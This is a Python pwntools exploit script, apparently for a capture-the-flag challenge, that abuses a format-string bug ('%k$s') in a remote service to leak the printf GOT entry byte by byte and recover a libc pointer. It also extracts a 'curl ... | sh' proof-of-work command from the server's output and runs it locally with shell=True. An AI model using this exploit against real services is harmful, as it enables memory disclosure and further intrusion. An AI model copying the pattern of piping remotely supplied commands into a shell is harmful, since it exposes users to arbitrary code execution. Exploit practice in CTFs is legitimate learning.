#!/usr/bin/env python3
# leak_printf_bytes.py
# Usage: python3 leak_printf_bytes.py <k_inbuf>
# Reads 8 bytes at PRINTF_GOT by reading one byte at a time via "%k$s".
# Requires: pwntools (pip3 install pwntools)

from pwn import remote
import struct, sys, time, re

HOST = "pwn1.cscv.vn"
PORT = 6789
PRINTF_GOT = 0x404028

def p64(x): return struct.pack("<Q", x)

def run_pow_and_connect(r):
    # read pow prompt and command, run it locally, send solution
    data = r.recvuntil(b'proof of work:', timeout=15)
    pow_line = r.recvline(timeout=15).decode(errors='ignore').strip()
    print("[*] POW line:", pow_line[:200])
    m = re.search(r'(curl .*?\| *sh .*?$)', pow_line)
    cmd = m.group(1).strip() if m else pow_line
    print("[*] Running POW cmd (locally)...")
    import subprocess
    proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, timeout=30)
    if proc.stdout == "":
        print("[!] POW runner gave no stdout. stderr:")
        print(proc.stderr)
        return False
    sol = proc.stdout.splitlines()[0].strip()
    r.sendline(sol.encode())
    # wait prompt
    try:
        r.recvuntil(b"Say something:", timeout=10)
    except Exception:
        pass
    return True

def leak_byte(k_inbuf, addr, attempt=0):
    """
    Put (addr) as first fake-arg, then send "|%{k_inbuf}$s|" and capture bytes between pipes.
    Return first byte (int) or 0 if nothing.
    """
    r = remote(HOST, PORT, timeout=20)
    ok = run_pow_and_connect(r)
    if not ok:
        r.close()
        raise RuntimeError("POW failed")
    payload = p64(addr) + b"|" + f"%{k_inbuf}$s".encode() + b"|\n"
    r.send(payload)
    # read a bit
    out = b""
    start = time.time()
    while True:
        try:
            chunk = r.recv(timeout=1)
            if not chunk:
                break
            out += chunk
        except Exception:
            if time.time() - start > 4:
                break
    r.close()
    # find between pipes
    try:
        a = out.index(b"|")
        b = out.index(b"|", a+1)
        seg = out[a+1:b]
    except ValueError:
        seg = b""
    if len(seg) >= 1:
        return seg[0], seg  # return byte value and full segment for debug
    else:
        return 0, seg

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 leak_printf_bytes.py <k_inbuf>")
        return
    k = int(sys.argv[1])
    print(f"[*] Using k_inbuf = {k}; reading 8 bytes from PRINTF_GOT = {hex(PRINTF_GOT)}")
    bytes_read = []
    segs = []
    for i in range(8):
        addr = PRINTF_GOT + i
        bval, seg = leak_byte(k, addr)
        bytes_read.append(bval)
        segs.append(seg)
        print(f"offset {i}: byte=0x{bval:02x}  seg={seg[:40]!r}")
    # assemble little-endian
    val = 0
    for i, bv in enumerate(bytes_read):
        val |= (bv & 0xff) << (8*i)
    print("\n[*] printf_leak (assembled little-endian) = 0x{:016x}".format(val))
    # sanity: print as possible libc-like
    if val == 0:
        print("[!] Warning: assembled value is 0 (maybe cannot read).")
    elif hex(val).startswith("0x7f") or hex(val).startswith("0x00007f"):
        print("[+] Looks like a libc pointer.")
    else:
        print("[!] Value doesn't look like typical libc pointer; but it's the raw GOT content.")
    return

if __name__ == "__main__":
    main()
